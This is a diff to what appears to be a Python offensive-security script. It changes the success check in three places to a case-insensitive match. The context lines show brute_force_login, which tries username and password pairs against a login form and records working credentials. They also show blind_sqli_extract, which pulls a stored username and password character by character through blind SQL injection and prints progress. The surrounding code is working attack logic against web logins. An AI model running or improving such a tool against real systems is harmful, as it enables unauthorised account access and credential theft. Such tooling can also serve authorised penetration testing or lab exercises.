@@ -103,7 +103,7 @@ def brute_force_login(url, form_params, method="POST", success_indicator="Login 
                     resp = requests.post(url, data=params, timeout=5)
                 else:
                     resp = requests.get(url, params=params, timeout=5)
-                if success_indicator in resp.text:
+                if success_indicator.lower() in resp.text.lower():
                     found_creds.append(f"{username_field}='{username}', {password_field}='{password}'")
                     if results is not None:
                         results['creds'] = found_creds
@@ -144,7 +144,7 @@ def blind_sqli_extract(url, form_params, method="POST", success_indicator="Login
                         resp = requests.post(url, data=params, timeout=5)
                     else:
                         resp = requests.get(url, params=params, timeout=5)
-                    if success_indicator in resp.text:
+                    if success_indicator.lower() in resp.text.lower():
                         extracted_username += chr(c)
                         print(f"[+] Username so far: {extracted_username}")
                         found = True
@@ -168,7 +168,7 @@ def blind_sqli_extract(url, form_params, method="POST", success_indicator="Login
                         resp = requests.post(url, data=params, timeout=5)
                     else:
                         resp = requests.get(url, params=params, timeout=5)
-                    if success_indicator in resp.text:
+                    if success_indicator.lower() in resp.text.lower():
                         extracted_password += chr(c)
                         print(f"[+] Password so far: {extracted_password}")
                         found = True
